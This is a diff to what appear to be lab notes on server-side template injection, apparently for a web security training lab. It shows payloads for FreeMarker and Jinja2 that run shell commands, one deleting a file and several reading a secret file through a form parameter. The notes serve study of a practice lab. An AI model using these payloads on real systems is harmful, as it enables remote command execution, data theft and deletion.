@@ -832,6 +832,15 @@ ${"freemarker.template.utility.Execute"?new()("rm morale.txt")}
 newEmail={{username}}!{{+self.init.globals.builtins.import('os').popen('cat+/home/carlos/secret').read()+}}
 &csrf=csrf
 ```
+or
+```
+newEmail={{ self.__init__.__globals__.os.popen('cat+/home/carlos/secret').read() }}&csrf=csrf
+```
+or
+```
+newEmail={{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/carlos/secret').read() }}&csrf=csrf
+```
+
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2
 
 
